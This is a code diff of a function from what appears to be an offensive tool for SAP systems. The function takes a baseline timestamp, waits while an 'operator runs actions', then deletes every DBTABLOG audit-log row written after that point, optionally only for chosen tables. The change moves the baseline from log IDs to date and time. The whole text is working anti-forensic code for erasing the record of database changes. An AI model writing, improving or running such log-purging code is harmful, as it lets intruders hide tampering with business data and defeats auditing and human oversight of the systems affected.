@@ -1317,20 +1317,19 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
     sid = getattr(node, "sid", "?")
     tabs = list(tabname_filter or [])
 
-    from sap_dbtablog_purge import read_max_logid, purge_dbtablog
+    from sap_dbtablog_purge import (read_baseline_timestamp,
+                                       purge_dbtablog)
 
-    # Step 1 — baseline.
-    print(f"[*] {sid}: reading DBTABLOG baseline (MAX LOGID) …")
-    base = read_max_logid(node)
+    # Step 1 — baseline (sy-datum + sy-uzeit on the SAP server).
+    print(f"[*] {sid}: reading DBTABLOG baseline timestamp …")
+    base = read_baseline_timestamp(node)
     if not base["ok"]:
         return _wrap_result(technique, False,
                              error=f"baseline read failed: "
                                     f"{base.get('error', '?')}")
-    baseline_logid = base["baseline"]
-    print(f"[+] {sid}: baseline LOGID = {baseline_logid!r}")
-    if not baseline_logid:
-        print(f"[!] {sid}: DBTABLOG is empty — purge will catch every "
-              f"row written in the hold window")
+    base_date = base["base_date"]
+    base_time = base["base_time"]
+    print(f"[+] {sid}: baseline = {base_date} {base_time}")
 
     # Step 2 — hold (operator runs actions here).
     if hold_seconds > 0:
@@ -1341,18 +1340,20 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
         _time.sleep(max(0.0, float(hold_seconds)))
 
     # Step 3 — purge.
+    where_txt = (f"LOGDATE/LOGTIME > {base_date} {base_time}")
     if tabs:
-        print(f"[*] {sid}: purging DBTABLOG WHERE LOGID > baseline "
+        print(f"[*] {sid}: purging DBTABLOG WHERE {where_txt} "
               f"AND TABNAME IN {tabs} …")
     else:
-        print(f"[*] {sid}: purging DBTABLOG WHERE LOGID > baseline "
+        print(f"[*] {sid}: purging DBTABLOG WHERE {where_txt} "
               f"(all tables) …")
-    purge = purge_dbtablog(node, baseline_logid, tabname_filter=tabs)
+    purge = purge_dbtablog(node, base_date, base_time,
+                            tabname_filter=tabs)
     if not purge["ok"]:
         return _wrap_result(technique, False,
                              error=f"purge failed: "
                                     f"{purge.get('error', '?')}",
-                             baseline_logid=baseline_logid)
+                             base_date=base_date, base_time=base_time)
 
     deleted = purge["deleted_count"]
     print(f"[+] {sid}: DBTABLOG purged — {deleted} row(s) deleted, "
@@ -1364,13 +1365,14 @@ def tier3_dbtablog_purge(state, node, hold_seconds: float = 30.0,
         emit_finding(
             "INFO", sid,
             f"Tier 3: DBTABLOG purged — {deleted} entries deleted "
-            f"(LOGID > {baseline_logid}){scope_txt}")
+            f"(> {base_date} {base_time}){scope_txt}")
     except Exception:
         pass
 
     return _wrap_result(
         technique, True,
-        baseline_logid=baseline_logid,
+        base_date=base_date,
+        base_time=base_time,
         deleted_count=deleted,
         remaining_count=purge["remaining_count"],
         tabname_filter=tabs,
